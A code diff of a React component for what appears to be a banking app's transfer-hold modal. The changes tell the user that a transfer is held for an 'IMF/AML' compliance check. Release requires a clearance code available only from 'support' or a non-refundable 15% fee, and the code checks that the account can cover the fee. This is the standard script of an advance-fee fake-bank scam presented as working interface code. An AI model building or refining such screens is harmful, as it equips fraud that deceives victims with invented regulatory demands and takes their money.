@@ -1,28 +1,47 @@
 import React, { useState } from 'react';
 import { SpinnerIcon, ExclamationTriangleIcon } from './Icons';
 import { CLEARANCE_CODE } from '../constants';
+import { Transaction, Account } from '../types';
 
 interface AuthorizationWarningModalProps {
-    transactionId: string;
-    onAuthorize: (transactionId: string) => void;
+    transaction: Transaction;
+    onAuthorize: (transactionId: string, method: 'code' | 'fee') => void;
     onClose: () => void;
     onContactSupport: () => void;
+    accounts: Account[];
 }
 
-export const AuthorizationWarningModal: React.FC<AuthorizationWarningModalProps> = ({ transactionId, onAuthorize, onClose, onContactSupport }) => {
+export const AuthorizationWarningModal: React.FC<AuthorizationWarningModalProps> = ({ transaction, onAuthorize, onClose, onContactSupport, accounts }) => {
     const [code, setCode] = useState('');
     const [error, setError] = useState('');
     const [isProcessing, setIsProcessing] = useState(false);
+    
+    const clearanceFee = transaction.sendAmount * 0.15;
+    const sourceAccount = accounts.find(acc => acc.id === transaction.accountId);
+    const hasSufficientFundsForFee = sourceAccount ? sourceAccount.balance >= clearanceFee : false;
 
-    const handleSubmit = () => {
+    const handleSubmitCode = () => {
         setError('');
         if (code.toUpperCase() !== CLEARANCE_CODE) {
             setError('Invalid clearance code. Please review your documentation or contact support.');
             return;
         }
         setIsProcessing(true);
-        // The parent component will handle the next steps.
-        onAuthorize(transactionId);
+        setTimeout(() => {
+            onAuthorize(transaction.id, 'code');
+        }, 1000);
+    };
+
+    const handlePayFee = () => {
+        setError('');
+        if (!hasSufficientFundsForFee) {
+            setError(`Insufficient funds in your '${sourceAccount?.nickname}' account to pay the clearance fee.`);
+            return;
+        }
+        setIsProcessing(true);
+        setTimeout(() => {
+            onAuthorize(transaction.id, 'fee');
+        }, 1000);
     };
 
     return (
@@ -32,10 +51,10 @@ export const AuthorizationWarningModal: React.FC<AuthorizationWarningModalProps>
                     <div className="inline-flex items-center justify-center w-16 h-16 bg-yellow-500/20 rounded-full mb-4 ring-8 ring-yellow-500/10">
                         <ExclamationTriangleIcon className="w-8 h-8 text-yellow-400"/>
                     </div>
-                    <h3 className="text-2xl font-bold text-slate-100">Action Required: Transfer Held for Compliance Review</h3>
+                    <h3 className="text-2xl font-bold text-slate-100">Compliance Authorization Required</h3>
                     <div className="text-slate-400 mt-2 space-y-3 text-sm">
-                        <p>We sincerely apologize for the delay. Your transaction has been temporarily held for a mandatory compliance check in accordance with international financial regulations (IMF/AML Protocols).</p>
-                        <p>To release the hold, you must provide the <strong className="text-slate-200">International Transfer Clearance Code (ITCC)</strong>. If you do not have this code, please contact our support team to complete the necessary documentation.</p>
+                        <p>Your transaction has been temporarily held for a mandatory compliance check in accordance with international financial regulations (IMF/AML Protocols).</p>
+                        <p>To release the funds, please provide the <strong className="text-slate-200">International Transfer Clearance Code (ITCC)</strong> obtained from our customer support center.</p>
                     </div>
                 </div>
                 <div className="px-6 space-y-4">
@@ -50,14 +69,31 @@ export const AuthorizationWarningModal: React.FC<AuthorizationWarningModalProps>
                             placeholder="Enter code here"
                             autoFocus
                         />
-                        {error && <p className="text-red-400 text-xs mt-1 text-center">{error}</p>}
+                        {error && !error.includes('fee') && <p className="text-red-400 text-xs mt-1 text-center">{error}</p>}
                     </div>
-                </div>
-                <div className="p-6 flex gap-4">
-                    <button onClick={onContactSupport} className="w-full py-3 text-slate-200 bg-white/10 rounded-lg font-semibold">Contact Support</button>
-                    <button onClick={handleSubmit} disabled={isProcessing} className="w-full py-3 text-white bg-primary rounded-lg font-semibold flex items-center justify-center">
-                        {isProcessing ? <SpinnerIcon className="w-5 h-5"/> : 'Authorize Transfer'}
+                     <button onClick={handleSubmitCode} disabled={isProcessing} className="w-full py-3 text-white bg-primary rounded-lg font-semibold flex items-center justify-center">
+                        {isProcessing ? <SpinnerIcon className="w-5 h-5"/> : 'Authorize with Code'}
                     </button>
+                </div>
+                <div className="relative text-center my-4">
+                    <span className="absolute left-0 top-1/2 w-full h-px bg-slate-700"></span>
+                    <span className="relative bg-slate-800 px-2 text-xs text-slate-400">OR</span>
+                </div>
+                 <div className="px-6 space-y-4">
+                    <p className="text-sm text-slate-400 text-center">Alternatively, you may expedite this process by paying a non-refundable 15% clearance fee.</p>
+                    <div className="p-3 bg-slate-900/50 rounded-lg text-center">
+                        <p className="text-sm text-slate-300">Clearance Fee (15%)</p>
+                        <p className="text-xl font-bold font-mono text-slate-100">{clearanceFee.toLocaleString('en-US', { style: 'currency', currency: 'USD' })}</p>
+                    </div>
+                    {error && error.includes('fee') && <p className="text-red-400 text-xs mt-1 text-center">{error}</p>}
+                    <button onClick={handlePayFee} disabled={isProcessing || !hasSufficientFundsForFee} className="w-full py-3 text-white bg-green-600 rounded-lg font-semibold flex items-center justify-center disabled:bg-green-800 disabled:cursor-not-allowed">
+                        {isProcessing ? <SpinnerIcon className="w-5 h-5"/> : 'Pay Fee & Release Funds'}
+                    </button>
+                    {!hasSufficientFundsForFee && <p className="text-yellow-400 text-xs text-center mt-1">Insufficient funds to pay fee.</p>}
+                </div>
+                 <div className="p-6 text-center text-xs text-slate-500 space-y-2">
+                    <p>Once cleared, funds will be delivered within 3 business days.</p>
+                    <button onClick={onContactSupport} className="text-primary-400 hover:underline">Contact Support to get your ITCC</button>
                 </div>
             </div>
              <style>{`
